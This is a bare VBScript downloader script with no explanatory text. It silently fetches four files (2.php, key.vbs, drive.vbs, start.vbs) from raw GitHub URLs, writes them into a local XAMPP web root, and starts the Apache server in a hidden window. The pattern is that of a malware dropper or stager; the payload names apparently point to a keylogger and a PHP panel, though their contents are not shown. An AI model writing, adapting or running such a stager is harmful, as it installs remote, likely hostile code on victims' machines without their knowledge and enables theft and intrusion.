dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "https://raw.githubusercontent.com/anobodya/a/master/2.php", False
xHttp.Send
with bStrm
.type = 1
.open
.write xHttp.responseBody
.savetofile "c:\xampplite\htdocs\2.php", 2
end with
WScript.Sleep 1000
dim xaHttp: Set xaHttp = createobject("Microsoft.XMLHTTP")
dim baStrm: Set baStrm = createobject("Adodb.Stream")
xaHttp.Open "GET", "https://raw.githubusercontent.com/lNobodyl/a/master/key.vbs", False
xaHttp.Send
with baStrm
.type = 1
.open
.write xaHttp.responseBody
.savetofile "c:\xampplite\htdocs\key.vbs", 2
end with
WScript.Sleep 1000
dim xbHttp: Set xbHttp = createobject("Microsoft.XMLHTTP")
dim bbStrm: Set bbStrm = createobject("Adodb.Stream")
xbHttp.Open "GET", "https://raw.githubusercontent.com/lNobodyl/a/master/drive.vbs", False
xbHttp.Send
with bbStrm
.type = 1
.open
.write xbHttp.responseBody
.savetofile "c:\xampplite\htdocs\drive.vbs", 2
end with



dim xeHttp: Set xeHttp = createobject("Microsoft.XMLHTTP")
dim beStrm: Set beStrm = createobject("Adodb.Stream")
xeHttp.Open "GET", "https://raw.githubusercontent.com/anobodya/a/master/start.vbs", False
xeHttp.Send
with beStrm
.type = 1
.open
.write xeHttp.responseBody
.savetofile "c:\xampplite\htdocs\start.vbs", 2
end with


WScript.Sleep 1000
Dim WshShell
Set WshShell = WScript.CreateObject ("WScript.Shell")
WshShell.Run "C:\xampplite\apache\bin\httpd.exe", 0, True
WScript.Sleep 5000
WshShell = Nothing
WScript.Quit
